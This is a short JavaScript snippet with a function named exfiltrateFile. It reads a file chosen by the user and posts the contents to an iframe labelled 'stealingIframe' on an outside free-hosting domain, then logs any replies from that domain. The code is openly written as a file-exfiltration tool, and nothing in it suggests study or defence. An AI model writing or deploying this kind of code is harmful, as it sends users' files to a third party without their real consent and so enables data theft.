async function exfiltrateFile() {
  const fileInput = document.getElementById('fileInput');

  if (fileInput.files.length === 0) {
    alert('Please select a file first.');
    return;
  }

  const file = fileInput.files[0];
  const reader = new FileReader();

  reader.onload = async function (event) {
    const fileContent = event.target.result; // Send file content to iframe

    const iframe = document.getElementById('stealingIframe');
    iframe.contentWindow.postMessage({
      type: 'fileContent',
      content: fileContent
    }, 'https://cyborjime.000webhostapp.com');
  };

  reader.readAsText(file);
}

window.addEventListener('message', event => {
  if (event.origin !== 'https://cyborjime.000webhostapp.com') return;
  console.log('Received message from iframe:', event.data);
});